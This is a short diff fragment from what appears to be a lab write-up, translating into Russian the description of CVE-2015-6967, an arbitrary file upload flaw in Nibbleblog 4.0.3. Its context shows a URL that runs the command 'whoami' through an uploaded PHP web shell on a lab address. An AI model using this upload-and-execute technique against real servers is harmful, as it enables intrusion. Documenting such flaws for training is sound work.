@@ -166,7 +166,7 @@ file cmd.php
 
 **CVE-2015-6967** (NVD: https://nvd.nist.gov/vuln/detail/CVE-2015-6967)
 
-Nibbleblog 4.0.3 - My Image plugin: arbitrary file upload (no extension/MIME validation).
+Nibbleblog 4.0.3 - плагин My Image: произвольная загрузка файлов (без проверки расширения/MIME).
 
 ```
 http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=whoami
